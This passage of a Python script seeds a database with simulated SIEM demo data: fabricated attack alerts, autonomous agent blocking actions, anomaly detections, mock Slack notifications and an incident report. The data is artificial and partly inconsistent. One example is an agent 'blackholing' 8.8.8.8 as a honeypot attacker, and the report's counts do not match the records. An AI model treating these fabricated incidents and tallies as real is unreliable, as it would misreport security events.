        "status": "investigating", "created_at": now - timedelta(minutes=55), "simulated": True,
    },
    # ── Other new attack alerts ──
    {
        "title": "Cryptojacking - XMRig Miner Deployed",
        "description": "Unauthorized XMRig cryptocurrency miner deployed on WORKSTATION-01 by attacker 172.105.66.71 (Vietnam). CPU at 98%, memory consumed, system degraded.",
        "severity": "high", "source_ip": "172.105.66.71", "hostname": "WORKSTATION-01",
        "rule_name": "Cryptojacking Detection", "rule_id": "builtin_cryptojacking",
        "status": "open", "created_at": now - timedelta(minutes=40), "simulated": True,
    },
    {
        "title": "DDoS Attack - 480 Gbps UDP Flood",
        "description": "Massive 480 Gbps volumetric UDP flood from Russia (185.220.101.42) targeting WEB-SERVER-01:80. Site down. CDN scrubbing center activated.",
        "severity": "critical", "source_ip": "185.220.101.42", "hostname": "WEB-SERVER-01",
        "rule_name": "DDoS Volumetric Attack", "rule_id": "builtin_ddos",
        "status": "open", "created_at": now - timedelta(minutes=35), "simulated": True,
    },
    {
        "title": "MITM Attack - ARP Spoofing on VLAN10",
        "description": "ARP cache poisoning detected on VLAN10. Attacker 10.0.0.30 is intercepting all LDAP authentication traffic between workstations and SERVER-DC01.",
        "severity": "high", "source_ip": "10.0.0.30", "hostname": "SERVER-DC01",
        "rule_name": "MITM ARP Poisoning", "rule_id": "builtin_mitm_arp",
        "status": "open", "created_at": now - timedelta(minutes=30), "simulated": True,
    },
    {
        "title": "Insider Threat - Bulk Data Exfiltration to USB",
        "description": "Employee admin_john copying 2.1GB of confidential HR/salary data to personal USB device outside business hours (02:34 AM). Policy violation.",
        "severity": "high", "source_ip": "10.0.0.20", "hostname": "LAPTOP-ADMIN",
        "rule_name": "Insider Data Theft", "rule_id": "builtin_insider_threat",
        "status": "investigating", "created_at": now - timedelta(minutes=25), "simulated": True,
    },
    {
        "title": "DNS Tunneling - Iodine Tool Detected",
        "description": "DNS tunneling tool 'iodine' detected on LAPTOP-ADMIN encoding data into DNS TXT queries to external malicious nameserver. Covert channel for data exfiltration.",
        "severity": "high", "source_ip": "10.0.0.20", "hostname": "LAPTOP-ADMIN",
        "rule_name": "DNS Tunneling Detection", "rule_id": "builtin_dns_tunnel",
        "status": "open", "created_at": now - timedelta(minutes=20), "simulated": True,
    },
]

alert_result = db["alerts"].insert_many(alerts)
alert_ids = alert_result.inserted_ids
print(f"  => {len(alert_ids)} security alerts created")

# ============================================================
# PHASE 3: THREAT INTELLIGENCE LOGS
# ============================================================
print("\n[PHASE 3] Populating Threat Intelligence...")
print("-" * 40)

threat_logs = []
for atk in ATTACKERS:
    threat_logs.append({
        "timestamp": now - timedelta(minutes=random.randint(1, 30)),
        "source_ip": atk["ip"],
        "threat_type": random.choice(["brute_force", "c2_communication", "port_scan", "data_exfil"]),
        "severity": random.choice(["critical", "high", "medium"]),
        "description": f"Threat intel match: {atk['ip']} ({atk['country']}) - Tagged as {atk['label']}",
        "country": atk["country"],
        "label": atk["label"],
        "rule_matched": "Threat Intelligence Feed",
        "simulated": True,
    })

db["threat_logs"].insert_many(threat_logs)
print(f"  => {len(threat_logs)} threat intel entries logged")

# ============================================================
# PHASE 4: AUTONOMOUS AGENT ACTIONS
# ============================================================
print("\n[PHASE 4] Autonomous Agent Responses...")
print("-" * 40)

agent_actions = [
    {
        "timestamp": now - timedelta(minutes=5),
        "alert_id": str(alert_ids[0]),
        "agent_type": "responder_agent",
        "action": "block_ip",
        "target": "185.220.101.42",
        "status": "completed",
        "success": True,
        "agent": "NetworkGuard-Agent",
        "description": "AUTO-BLOCKED IP 185.220.101.42 (Russia) on perimeter firewall after 5 failed RDP logins. Rule: Brute Force Auto-Response.",
        "result": "IP added to firewall deny list. All inbound/outbound traffic from this IP is now dropped.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=5),
        "alert_id": str(alert_ids[1]),
        "agent_type": "responder_agent",
        "action": "quarantine_file",
        "target": "C:\\Users\\Admin\\Desktop\\mimikatz.exe",
        "status": "completed",
        "success": True,
        "agent": "EndpointShield-Agent",
        "description": "AUTO-QUARANTINED malicious file mimikatz.exe. File moved to encrypted quarantine vault. Execution privileges revoked.",
        "result": "File SHA256: 92a3b1c4d5... quarantined. Process terminated (PID: 4892).",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=4),
        "alert_id": str(alert_ids[2]),
        "agent_type": "responder_agent",
        "action": "disable_service",
        "target": "WinDefendUpdate",
        "status": "completed",
        "success": True,
        "agent": "EndpointShield-Agent",
        "description": "AUTO-DISABLED malicious service 'WinDefendUpdate'. Service binary removed from C:\\Windows\\Temp\\.",
        "result": "Service stopped and set to Disabled. Executable deleted. Startup registry entry removed.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=4),
        "alert_id": str(alert_ids[3]),
        "agent_type": "responder_agent",
        "action": "restore_registry",
        "target": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\DisableAntiSpyware",
        "status": "completed",
        "success": True,
        "agent": "EndpointShield-Agent",
        "description": "AUTO-RESTORED Windows Defender registry key. DisableAntiSpyware reset from 1 to 0.",
        "result": "Registry key restored. Windows Defender real-time protection re-enabled. Full scan triggered.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=3),
        "alert_id": str(alert_ids[4]),
        "agent_type": "responder_agent",
        "action": "block_ip",
        "target": "45.33.32.156",
        "status": "completed",
        "success": True,
        "agent": "NetworkGuard-Agent",
        "description": "AUTO-BLOCKED C2 server IP 45.33.32.156 on all network segments. DNS sinkhole activated.",
        "result": "IP blacklisted on firewall + DNS sinkhole. All future connections will be intercepted.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=3),
        "alert_id": str(alert_ids[5]),
        "agent_type": "responder_agent",
        "action": "block_ip",
        "target": "185.220.101.42",
        "status": "completed",
        "success": True,
        "agent": "NetworkGuard-Agent",
        "description": "AUTO-BLOCKED lateral movement from 185.220.101.42. SMB access to FILESERVER-02 denied.",
        "result": "Network segment isolation applied. Share access revoked for external IPs.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=2),
        "alert_id": str(alert_ids[6]),
        "agent_type": "responder_agent",
        "action": "block_ip",
        "target": "103.40.121.88",
        "status": "completed",
        "success": True,
        "agent": "NetworkGuard-Agent",
        "description": "AUTO-BLOCKED data exfiltration attempt. FTP traffic to 103.40.121.88 (China) terminated.",
        "result": "Outbound FTP blocked. File exfil.7z preserved as evidence in forensic vault.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=2),
        "alert_id": str(alert_ids[8]),
        "agent_type": "responder_agent",
        "action": "disable_account",
        "target": "backdoor_admin",
        "status": "completed",
        "success": True,
        "agent": "IdentityGuard-Agent",
        "description": "AUTO-DISABLED rogue account 'backdoor_admin'. Account removed from Administrators group and locked.",
        "result": "Account disabled, password expired, removed from all privileged groups. Audit trail preserved.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=1),
        "alert_id": str(alert_ids[7]),
        "agent_type": "responder_agent",
        "action": "block_ip",
        "target": "103.40.121.88",
        "status": "completed",
        "success": True,
        "agent": "NetworkGuard-Agent",
        "description": "AUTO-BLOCKED SSH brute force source 103.40.121.88 (China). Rate limiting applied.",
        "result": "IP blocked. Geo-fencing rule added: all traffic from this ASN is now rate-limited.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=1),
        "alert_id": str(alert_ids[9]),
        "agent_type": "responder_agent",
        "action": "block_ip",
        "target": "198.51.100.77",
        "status": "completed",
        "success": True,
        "agent": "NetworkGuard-Agent",
        "description": "AUTO-BLOCKED scanner IP 198.51.100.77 (Germany). Port scan activity neutralized.",
        "result": "IP added to threat feed. Scan patterns logged for analysis.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=1),
        "alert_id": str(alert_ids[14]),
        "agent_type": "responder_agent",
        "action": "block_ip",
        "target": "193.23.244.244",
        "status": "completed",
        "success": True,
        "agent": "NetworkGuard-Agent",
        "description": "AUTO-BLOCKED known Tor Exit Node. Dynamic threat intelligence rule applied.",
        "result": "IP blacklisted on perimeter firewall.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=1),
        "alert_id": str(alert_ids[15]),
        "agent_type": "responder_agent",
        "action": "block_ip",
        "target": "193.23.244.244",
        "status": "completed",
        "success": True,
        "agent": "NetworkGuard-Agent",
        "description": "AUTO-BLOCKED Tor brute force. IP added to high-risk Tor pool.",
        "result": "IP fully blocked. All RDP access from Tor network denied.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=1),
        "alert_id": str(alert_ids[16]),
        "agent_type": "responder_agent",
        "action": "terminate_connection",
        "target": "193.23.244.244",
        "status": "completed",
        "success": True,
        "agent": "NetworkGuard-Agent",
        "description": "AUTO-TERMINATED Tor exfiltration connection.",
        "result": "Active session terminated. Outbound Tor connections permanently blocked.",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=1),
        "alert_id": str(alert_ids[17]),
        "agent_type": "responder_agent",
        "action": "blackhole_route",
        "target": "8.8.8.8",
        "status": "completed",
        "success": True,
        "agent": "Deception-Agent",
        "description": "AUTO-ROUTED honeypot attacker to infinite tarpit. Attacker resources being consumed.",
        "result": "Attacker trapped in honeypot. IP flagged for global ban.",
        "simulated": True,
    },
]

db["agent_actions"].insert_many(agent_actions)
print(f"  => {len(agent_actions)} autonomous agent actions executed")

# ============================================================
# PHASE 5: AI ANOMALY DETECTIONS
# ============================================================
print("\n[PHASE 5] AI Anomaly Detections...")
print("-" * 40)

anomalies = [
    {
        "type": "volume_spike",
        "severity": "high",
        "title": "Log Volume Spike Detected",
        "description": "Current hour: 487 logs (baseline avg: 45, z-score: 9.8). Massive spike correlated with active attack.",
        "current_value": 487,
        "baseline_avg": 45.0,
        "z_score": 9.82,
        "metric": "log_volume_per_hour",
        "detected_at": now - timedelta(minutes=5),
        "resolved": False,
        "simulated": True,
    },
    {
        "type": "threat_rate_spike",
        "severity": "critical",
        "title": "Threat Detection Rate Spike",
        "description": "Current threat rate: 68.2% (baseline: 3.1%). Active multi-stage attack in progress.",
        "current_rate": 68.2,
        "baseline_rate": 3.1,
        "metric": "threat_rate",
        "detected_at": now - timedelta(minutes=4),
        "resolved": False,
        "simulated": True,
    },
    {
        "type": "new_source_ips",
        "severity": "high",
        "title": "5 New Source IPs Detected",
        "description": "5 new external IPs detected that were never seen in the past 7 days. All originate from known threat actor infrastructure.",
        "new_ips": [a["ip"] for a in ATTACKERS],
        "metric": "new_ips",
        "detected_at": now - timedelta(minutes=3),
        "resolved": False,
        "simulated": True,
    },
    {
        "type": "unusual_events",
        "severity": "medium",
        "title": "Unusual Event IDs Detected",
        "description": "8 event IDs not seen in baseline period: [4740, 7045, 4720, 4732, 4698, 4657, 5157, 5140]. Indicative of post-exploitation activity.",
        "new_event_ids": [4740, 7045, 4720, 4732, 4698, 4657, 5157, 5140],
        "metric": "new_event_ids",
        "detected_at": now - timedelta(minutes=2),
        "resolved": False,
        "simulated": True,
    },
    {
        "type": "tor_traffic",
        "severity": "high",
        "title": "Darkweb Routing Detected",
        "description": "Inbound connections mapped to Tor exit nodes. Attackers attempting to anonymize origin.",
        "metric": "tor_nodes",
        "detected_at": now - timedelta(minutes=1),
        "resolved": False,
        "simulated": True,
    },
    {
        "type": "honeypot_interaction",
        "severity": "critical",
        "title": "Deception Network Triggered",
        "description": "Zero-trust honeypot host HONEYPOT-SRV01 received inbound SSH traffic. Absolute indicator of compromise.",
        "metric": "honeypot_hits",
        "detected_at": now - timedelta(minutes=1),
        "resolved": False,
        "simulated": True,
    },
]

db["anomalies"].insert_many(anomalies)
print(f"  => {len(anomalies)} AI anomalies detected")

# ============================================================
# PHASE 6: NOTIFICATIONS
# ============================================================
print("\n[PHASE 6] Sending Notifications...")
print("-" * 40)

notifications = [
    {
        "timestamp": now - timedelta(minutes=6),
        "alert_title": "[CRITICAL] Brute Force Attack detected from 185.220.101.42",
        "severity": "critical",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=5),
        "alert_title": "[CRITICAL] Credential Theft - mimikatz.exe execution on SERVER-DC01",
        "severity": "critical",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=5),
        "alert_title": "[AGENT] NetworkGuard: AUTO-BLOCKED 185.220.101.42 (Russia)",
        "severity": "high",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=4),
        "alert_title": "[AGENT] EndpointShield: Quarantined mimikatz.exe on SERVER-DC01",
        "severity": "high",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=4),
        "alert_title": "[CRITICAL] Malicious service 'WinDefendUpdate' installed - persistence detected",
        "severity": "critical",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=3),
        "alert_title": "[AGENT] EndpointShield: Service 'WinDefendUpdate' DISABLED and removed",
        "severity": "high",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=3),
        "alert_title": "[AGENT] NetworkGuard: C2 server 45.33.32.156 BLOCKED + DNS sinkhole",
        "severity": "high",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=2),
        "alert_title": "[AGENT] IdentityGuard: Rogue account 'backdoor_admin' DISABLED",
        "severity": "high",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=2),
        "alert_title": "[AI] Anomaly: Log volume 10x above baseline - active attack confirmed",
        "severity": "high",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=1),
        "alert_title": "[AI] Threat rate: 68% (baseline 3%) - multi-stage intrusion in progress",
        "severity": "critical",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now - timedelta(minutes=1),
        "alert_title": "[AGENT] Data exfiltration to China BLOCKED - evidence preserved",
        "severity": "high",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
    {
        "timestamp": now,
        "alert_title": "[REPORT] Incident Response Report #IR-2026-0412 generated automatically",
        "severity": "high",
        "channels": ["slack"],
        "results": [{"sent": True, "channel": "slack", "mock": True}],
        "status": "sent",
        "simulated": True,
    },
]

db["notification_log"].insert_many(notifications)
print(f"  => {len(notifications)} notifications sent")

# ============================================================
# PHASE 7: AUTO-GENERATED INCIDENT REPORT
# ============================================================
print("\n[PHASE 7] Generating Incident Report...")
print("-" * 40)

report = {
    "title": "Incident Response Report - Multi-Stage APT Attack",
    "type": "incident",
    "generated_at": now,
    "generated_by": "CortexSIEM AI Engine",
    "status": "final",
    "severity": "critical",
    "simulated": True,
    "executive_summary": (
        "On April 12, 2026, CortexSIEM detected and autonomously responded to a coordinated "
        "multi-stage cyber attack targeting the corporate network. The attack originated from "
        "multiple external threat actors (Russia, China, Ukraine, Germany) and progressed through "
        "Initial Access, Credential Theft, Persistence, Defense Evasion, Lateral Movement, and "
        "attempted Data Exfiltration. All attack vectors were neutralized by autonomous agents "
        "within 6 minutes of initial detection."
    ),
    "attack_timeline": [
        {"time": "T+0 min",  "phase": "Initial Access",     "detail": "RDP brute force from 185.220.101.42 (Russia) - 5 failed logins"},
        {"time": "T+1 min",  "phase": "Account Lockout",     "detail": "Administrator account locked after failed attempts"},
        {"time": "T+2 min",  "phase": "Credential Theft",    "detail": "mimikatz.exe executed - LSASS memory dumped"},
        {"time": "T+3 min",  "phase": "Persistence",         "detail": "Malicious service 'WinDefendUpdate' installed"},
        {"time": "T+4 min",  "phase": "Defense Evasion",     "detail": "Windows Defender disabled via registry modification"},
        {"time": "T+5 min",  "phase": "Privilege Escalation","detail": "Rogue account 'backdoor_admin' created and elevated"},
        {"time": "T+6 min",  "phase": "C2 Communication",    "detail": "Outbound connection to 45.33.32.156:4444 BLOCKED"},
        {"time": "T+7 min",  "phase": "Lateral Movement",    "detail": "Admin share access on FILESERVER-02 from external IP"},
        {"time": "T+8 min",  "phase": "Data Exfiltration",   "detail": "FTP upload to China BLOCKED - evidence preserved"},
    ],
    "agent_responses": [
        {"agent": "NetworkGuard",    "actions": 5, "detail": "Blocked 4 attacker IPs + C2 server, DNS sinkhole activated"},
        {"agent": "EndpointShield",  "actions": 3, "detail": "Quarantined mimikatz, disabled malicious service, restored Defender"},
        {"agent": "IdentityGuard",   "actions": 1, "detail": "Disabled rogue account, revoked privileges"},
    ],
    "statistics": {
        "total_logs_analyzed": len(raw_logs),
        "critical_alerts": 4,
        "high_alerts": 5,
        "medium_alerts": 3,
        "low_alerts": 2,
        "attacker_ips_blocked": 4,
        "files_quarantined": 1,
        "services_disabled": 1,
        "accounts_disabled": 1,
        "mean_time_to_detect": "< 30 seconds",
        "mean_time_to_respond": "< 60 seconds",
        "data_exfiltrated": "0 bytes (blocked)",
    },
    "mitre_techniques": [
        "T1110 - Brute Force",
        "T1003 - Credential Dumping",
        "T1543.003 - Create or Modify System Process: Windows Service",
        "T1562.001 - Impair Defenses: Disable or Modify Tools",
        "T1136 - Create Account",
        "T1078 - Valid Accounts",
        "T1071 - Application Layer Protocol (C2)",
        "T1021.002 - Remote Services: SMB/Windows Admin Shares",
        "T1041 - Exfiltration Over C2 Channel",
        "T1046 - Network Service Discovery",
    ],
    "recommendations": [
        "Rotate all domain admin credentials immediately",
        "Conduct full forensic analysis of SERVER-DC01 and FILESERVER-02",
        "Review all recently created user accounts across the domain",
        "Implement MFA for all remote access (RDP, VPN, SSH)",
        "Deploy network segmentation between critical servers",
        "Update threat intelligence feeds with identified IOCs",
        "Schedule penetration test to validate remediation effectiveness",
    ],
}

db["reports"].insert_one(report)
print("  => Incident Report IR-2026-0412 generated")

# ============================================================
# SUMMARY
# ============================================================
print("\n" + "=" * 60)
print("  SIMULATION COMPLETE")
print("=" * 60)
print(f"""
  Raw Logs:        {len(raw_logs)} (15 CRITICAL, 12 HIGH, 10 MEDIUM, 10 LOW)
  Alerts:          {len(alerts)}
  Threat Intel:    {len(threat_logs)}
  Agent Actions:   {len(agent_actions)} (all auto-blocked)
  AI Anomalies:    {len(anomalies)}
  Notifications:   {len(notifications)}
  Reports:         1 (Full Incident Report)

  >> Restart backend and refresh dashboard to see everything!
  >> Click 'Run Quick AI Detection' for ML scan results.
""")
